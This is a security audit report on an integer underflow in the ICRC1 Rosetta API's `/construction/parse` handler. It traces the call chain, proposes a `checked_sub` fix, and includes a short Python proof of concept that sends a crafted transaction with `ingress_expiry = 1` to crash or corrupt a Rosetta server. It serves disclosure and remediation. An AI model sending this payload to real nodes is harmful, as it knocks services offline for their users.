Audit Report

## Title
Unguarded u64 Underflow in `handle_construction_parse` Enables Unauthenticated DoS or Silent Metadata Corruption — (`rs/rosetta-api/icrc1/src/construction_api/utils.rs`)

## Summary

In `handle_construction_parse`, the `ingress_start` metadata field is computed using a bare `-` operator on an attacker-controlled `u64` value with no underflow guard. An unauthenticated HTTP client can submit a crafted transaction with a small `ingress_expiry` value to `/construction/parse`, triggering a panic in debug builds (DoS) or silent wrapping arithmetic producing a garbage `ingress_start` timestamp in release builds (metadata corruption).

## Finding Description

`MAX_INGRESS_TTL = 300s` and `PERMITTED_DRIFT = 60s`, so the subtrahend is `240_000_000_000` nanoseconds. [1](#0-0) 

The bare subtraction at `utils.rs:520-524` applies this directly to the attacker-supplied minimum `ingress_expiry`: [2](#0-1) 

Any `ingress_expiry < 240_000_000_000` causes underflow. There are no bounds checks anywhere in the call chain:

1. `endpoints.rs:109-119` — unauthenticated HTTP handler, no expiry pre-validation: [3](#0-2) 

2. `services.rs:196-231` — parses raw CBOR and extracts `ingress_expiry_start` directly from attacker input, then calls `handle_construction_parse` with no bounds check: [4](#0-3) 

3. `types.rs:163-168` — `get_lowest_ingress_expiry` returns the raw minimum from attacker-supplied envelope contents: [5](#0-4) 

For contrast, `handle_construction_submit` correctly uses `saturating_add` for similar timestamp arithmetic: [6](#0-5) 

## Impact Explanation

This matches **High ($2,000–$10,000)**: "Application/platform-level DoS, crash" and "Significant Rosetta... security impact with concrete user or protocol harm."

- **Debug builds**: Rust's default overflow checks cause an immediate `panic!`, crashing the Rosetta server process. A single unauthenticated request is sufficient for persistent DoS.
- **Release builds**: Wrapping arithmetic produces `ingress_start ≈ u64::MAX - 239_999_999_998`, a garbage timestamp returned in the response metadata. Clients relying on this value for transaction construction receive silently corrupted data, potentially causing transaction failures or incorrect window calculations.

## Likelihood Explanation

Exploitation requires only a single unauthenticated HTTP POST to `/construction/parse` with a CBOR-encoded `UnsignedTransaction` containing `ingress_expiry = 1`. No keys, credentials, or privileged access are needed. The `UnsignedTransaction` CBOR format is documented and straightforward to construct. The attack is trivially repeatable.

## Recommendation

Replace the bare subtraction with `checked_sub` and propagate an error on underflow:

```rust
ingress_start: ingress_expiry_start.and_then(|start| {
    start.checked_sub(
        (ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT).as_nanos() as u64
    )
}),
```

Or validate `ingress_expiry_start >= (MAX_INGRESS_TTL - PERMITTED_DRIFT).as_nanos() as u64` in `construction_parse` before calling `handle_construction_parse`, returning `Error::parsing_unsuccessful` if not.

## Proof of Concept

```python
import cbor2, requests

envelope_content = {
    "request_type": "call",
    "canister_id": b'\x00' * 10,
    "method_name": "icrc1_transfer",
    "arg": b'DIDL\x00\x00',
    "sender": b'\x04',
    "ingress_expiry": 1,  # triggers underflow: 1 - 240_000_000_000
    "nonce": b'\x00',
}
unsigned_tx = {"envelope_contents": [envelope_content]}
tx_hex = cbor2.dumps(unsigned_tx).hex()

resp = requests.post("http://<rosetta-host>/construction/parse", json={
    "network_identifier": {"blockchain": "Internet Computer", "network": "<subnet>"},
    "signed": False,
    "transaction": tx_hex,
})
# Debug build: server panics (connection reset / 500) — DoS
# Release build: ingress_start ≈ u64::MAX - 239_999_999_998 in response
print(resp.status_code, resp.text)
```

A unit test can also directly call `handle_construction_parse` with `ingress_expiry_start = Some(1)` and assert it returns an error rather than panicking or returning a wrapped value.

```rust
pub fn construction_parse(
    transaction_string: String,
    transaction_is_signed: bool,
    currency: Currency,
) -> Result<ConstructionParseResponse, Error> {
    let (ingress_expiry_start, ingress_expiry_end, envelope_contents) = if transaction_is_signed {
        let signed_transaction = SignedTransaction::from_str(&transaction_string)
            .map_err(|err| Error::parsing_unsuccessful(&err))?;
        (
            signed_transaction.get_lowest_ingress_expiry(),
            signed_transaction.get_highest_ingress_expiry(),
            signed_transaction
                .envelopes
                .into_iter()
                .map(|envelope| envelope.content.into_owned())
                .collect(),
        )
    } else {
        let unsigned_transaction = UnsignedTransaction::from_str(&transaction_string)
            .map_err(|err| Error::parsing_unsuccessful(&err))?;
        (
            unsigned_transaction.get_lowest_ingress_expiry(),
            unsigned_transaction.get_highest_ingress_expiry(),
            unsigned_transaction.envelope_contents,
        )
    };

    handle_construction_parse(
        envelope_contents,
        currency,
        ingress_expiry_start,
        ingress_expiry_end,
        transaction_is_signed,
    )
    .map_err(|err| Error::processing_construction_failed(&err))
}
```
